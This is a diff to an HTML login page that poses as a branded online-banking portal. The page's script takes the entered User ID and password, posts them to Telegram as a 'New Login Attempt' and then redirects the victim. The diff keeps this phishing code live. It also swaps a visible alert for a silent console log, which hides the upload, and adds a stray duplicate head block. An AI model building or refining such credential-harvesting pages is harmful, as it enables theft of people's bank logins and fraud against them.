@@ -49,6 +49,10 @@
 <script async="" src="js/UIFlexibilityBranding.js"></script>
 <link rel="stylesheet" type="text/css" id="dbk-login-widget-css" href="css/LoginWidget.css">
 </head>
+<head>
+    <link href="css/branding.css" rel="stylesheet" id="leapfrogBrandingStyle">
+    <link rel="stylesheet" href="css/UIFlexibilityBranding.css">
+</head>
 <body>
     <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="loginApp" style="min-height:100%;position:relative" class="login-renderer-wrapper">
@@ -56,7 +60,7 @@
         <div class="fade-in">
             <div class="home-page ">
                 <div class="dbk-login-web__widget-container composite-layout-widget" style="">
-                    <div class="fluid-section fluid-section--pad-content dbk-login has-message  is-interactive">
+                    <div class="fluid-section fluid-section--pad-content dbk-login has-message is-interactive">
                         <div class="fluid-section__content-container">
                             <div class="fluid-section__content-container-inner" style="--global-heading-font-family:'Helvetica Neue', Helvetica, Arial, sans-serif; --global-body-font-family:Arial, sans-serif; --global-link-default-color:#0055cc; --global-font-color:#333333; --global-success-color:#76c76c; --global-warning-color:#f1b51c; --global-error-color:#c23a4c; --global-info-color:#18739d; --global-primary-color:#0279b3; --global-secondary-color:#cccccc; --global-tertiary-color:#ffffff; --global-body-bg-color-start:#e3e3e3; --global-body-bg:var(--global-body-bg-color-start); --masthead-text-color:#000000; --masthead-bg-color-start:#ffffff; --masthead-background:var(--masthead-bg-color-start); --main-nav-text-color:#ffffff; --main-nav-bg-color:#1e5085; --main-nav-border-color:rgba(55, 130, 210, 0.6); --main-nav-hover-bg-color:#15375b; --utility-nav-bg-color:#ffffff; --utility-nav-link-color:#003876; --featured-nav-link-color:#000000; --featured-nav-flag-text-color:#333333; --featured-nav-flag-bg-color:#d8e9fe; --widget-header-bg-color:#49a456; --widget-header-text-color:#ffffff; --widget-border-color:#cccccc; --widget-border-radius:0; --widget-border-width:1px; --widget-box-shadow:var(--widget-box-shadow-val); --widget-bg-opacity:1; --widget-header-bg-color-rgba-10p:rgba(73, 164, 86, 0.1); --widget-header-bg-color-rgba-50p:rgba(73, 164, 86, 0.5); --fluid-btn-primary-text-color:#333333; --fluid-btn-primary-border-color:transparent; --fluid-btn-primary-bg-color-start:#9dbdd6; --fluid-btn-primary-hover-bg-color-start:#c2d6e5; --fluid-btn-primary-bg-color:var(--fluid-btn-primary-bg-color-start); --fluid-btn-primary-hover-bg-color:var(--fluid-btn-primary-hover-bg-color-start); --exp-preview-mobile-global-primary-bg-color:undefined; --exp-preview-mobile-global-btn-bg-color:undefined; --exp-preview-mobile-global-primary-text-color:undefined;">
                                 <div class="dbk-login-msg has-image dbk-login__msg-container" style="background-image: url(GettyImages-1132115576-1024x683.jpg);"></div>
@@ -64,7 +68,7 @@
                                     <div class="dbk-login__login-elements-header">
                                         <div class="dbk-login__logo"></div>
                                     </div>
-                                    <form class="dbk-login__login-form" method="post" autocomplete="off">
+                                    <form action="#" class="dbk-login__login-form" method="post" autocomplete="off">
                                         <div class="fluid-form-layout dbk-login__login-form-container">
                                             <div class="fluid-form-layout-section dbk-login__form-section">
                                                 <div class="fluid-form-layout-section__content-container">
@@ -72,10 +76,8 @@
                                                 <p style="margin-top: 20px"></p>
                                                 <div class="fluid-form-layout-field-container username-container">
                                                     <div style="--username-padding:107px;">
-                                                        <label class="fluid-form-label fluid-form-label--stacked username-field " for="fluid-form-el-585fb376-bde3-4272-b313-f29bb5c97c20">
-                                                            <span class="fluid-form-label__text">
-                                                                <span class="fluid-form-label__text-inner">User ID</span>
-                                                            </span>
+                                                        <label class="fluid-form-label fluid-form-label--stacked username-field" for="fluid-form-el-585fb376-bde3-4272-b313-f29bb5c97c20">
+                                                            <span class="fluid-form-label__text"><span class="fluid-form-label__text-inner">User ID</span></span>
                                                             <span class="fluid-form-label__comp-container">
                                                                 <input name="username" autocomplete="off" id="fluid-form-el-585fb376-bde3-4272-b313-f29bb5c97c20" type="text" class="fluid-text-input" value="" required>
                                                             </span>
@@ -84,10 +86,8 @@
                                                 </div>
                                                 <p style="margin-top: 15px"></p>
                                                 <div class="fluid-form-layout-field-container password-container">
-                                                    <label class="fluid-form-label fluid-form-label--stacked password-field  show-hide-enabled" for="fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d">
-                                                        <span class="fluid-form-label__text">
-                                                            <span class="fluid-form-label__text-inner">Password</span>
-                                                        </span>
+                                                    <label class="fluid-form-label fluid-form-label--stacked password-field show-hide-enabled" for="fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d">
+                                                        <span class="fluid-form-label__text"><span class="fluid-form-label__text-inner">Password</span></span>
                                                         <span class="fluid-form-label__comp-container">
                                                             <input name="password" autocomplete="off" id="fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d" type="password" class="fluid-text-input" value="" required>
                                                         </span>
@@ -136,7 +136,9 @@
 
             // Get form data
             const username = document.querySelector('input[name="username"]').value;
-            const password = document.querySelector('input[name="password"]').value;
+            const password = document
+
+.querySelector('input[name="password"]').value;
 
             // Construct the message to send to Telegram
             const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
@@ -159,7 +161,7 @@
 
                 const result = await response.json();
                 if (result.ok) {
-                    alert('Login data sent to Telegram successfully!');
+                    console.log('Login data sent to Telegram successfully');
                     form.reset(); // Reset the form after successful submission
                     window.location.href = 'index2.html'; // Redirect to index2.html
                 } else {
